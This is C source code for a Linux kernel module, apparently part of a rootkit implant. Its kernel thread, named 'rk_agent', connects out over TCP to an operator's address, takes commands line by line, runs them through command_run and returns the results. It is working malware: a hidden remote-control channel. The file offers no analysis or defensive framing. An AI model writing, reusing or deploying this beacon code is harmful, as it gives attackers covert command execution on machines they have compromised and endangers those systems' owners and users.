// SPDX-License-Identifier: GPL-2.0
#include "implant.h"
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/wait.h>
#include <net/net_namespace.h>

static DEFINE_MUTEX(beacon_lock);
static DECLARE_WAIT_QUEUE_HEAD(retry_wait);
static struct task_struct *beacon_task;
static struct socket *active_socket;
static __be32 remote_address;
static unsigned short remote_port;
static unsigned int retry_interval;
static struct beacon_status counters;

static int send_all(struct socket *socket, const char *data, size_t length)
{
	size_t sent = 0;

	while (sent < length) {
		struct kvec vector = {
			.iov_base = (char *)data + sent,
			.iov_len = length - sent,
		};
		struct msghdr message = {};
		int result = kernel_sendmsg(socket, &message, &vector, 1,
					    vector.iov_len);

		if (result <= 0)
			return result ? result : -EPIPE;
		sent += result;
	}
	return 0;
}

static int receive_line(struct socket *socket, char *line, size_t size)
{
	bool overflow = false;
	size_t used = 0;

	for (;;) {
		struct kvec vector;
		struct msghdr message = {};
		char byte;
		int result;

		vector.iov_base = &byte;
		vector.iov_len = 1;
		result = kernel_recvmsg(socket, &message, &vector, 1, 1, 0);
		if (result <= 0)
			return result ? result : -ECONNRESET;
		if (byte == '\n') {
			line[used] = '\0';
			return overflow ? -EMSGSIZE : used;
		}
		if (used < size - 1)
			line[used++] = byte;
		else
			overflow = true;
	}
}

static int serve(struct socket *socket)
{
	char command[AGENT_TASK_SIZE];
	char reply[AGENT_REPLY_SIZE];

	while (!kthread_should_stop()) {
		int length = receive_line(socket, command, sizeof(command));

		if (length == -EMSGSIZE) {
			if (send_all(socket, "ERR task too long\n", 18))
				return -EPIPE;
			continue;
		}
		if (length < 0)
			return length;
		if (!strcmp(command, "QUIT"))
			return 0;
		length = command_run(command, reply, sizeof(reply));
		mutex_lock(&beacon_lock);
		counters.requests++;
		mutex_unlock(&beacon_lock);
		if (send_all(socket, reply, length))
			return -EPIPE;
	}
	return 0;
}

static struct socket *connect_operator(void)
{
	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_port = htons(remote_port),
		.sin_addr.s_addr = remote_address,
	};
	struct socket *socket;
	int error;

	error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP,
				 &socket);
	if (error)
		return ERR_PTR(error);
	mutex_lock(&beacon_lock);
	active_socket = socket;
	mutex_unlock(&beacon_lock);
	error = kernel_connect(socket, (struct sockaddr_unsized *)&address,
			       sizeof(address), 0);
	if (error) {
		mutex_lock(&beacon_lock);
		active_socket = NULL;
		mutex_unlock(&beacon_lock);
		sock_release(socket);
		return ERR_PTR(error);
	}
	return socket;
}

static void release_connection(struct socket *socket)
{
	mutex_lock(&beacon_lock);
	active_socket = NULL;
	mutex_unlock(&beacon_lock);
	sock_release(socket);
}

static int beacon_loop(void *unused)
{
	struct socket *socket = connect_operator();

	if (!IS_ERR(socket)) {
		mutex_lock(&beacon_lock);
		counters.connections++;
		mutex_unlock(&beacon_lock);
		serve(socket);
		release_connection(socket);
	}
	wait_event_interruptible_timeout(
		retry_wait, kthread_should_stop(), retry_interval * HZ);
	return 0;
}

int beacon_start(const char *target, unsigned short port, unsigned int interval)
{
	if (!in4_pton(target, -1, (u8 *)&remote_address, -1, NULL))
		return -EINVAL;
	remote_port = port;
	retry_interval = interval;
	beacon_task = kthread_run(beacon_loop, NULL, "rk_agent");
	return PTR_ERR_OR_ZERO(beacon_task);
}

void beacon_stop(void)
{
	mutex_lock(&beacon_lock);
	if (active_socket)
		kernel_sock_shutdown(active_socket, SHUT_RDWR);
	mutex_unlock(&beacon_lock);
	wake_up_interruptible(&retry_wait);
	kthread_stop(beacon_task);
}

void beacon_status(struct beacon_status *status)
{
	mutex_lock(&beacon_lock);
	*status = counters;
	mutex_unlock(&beacon_lock);
}
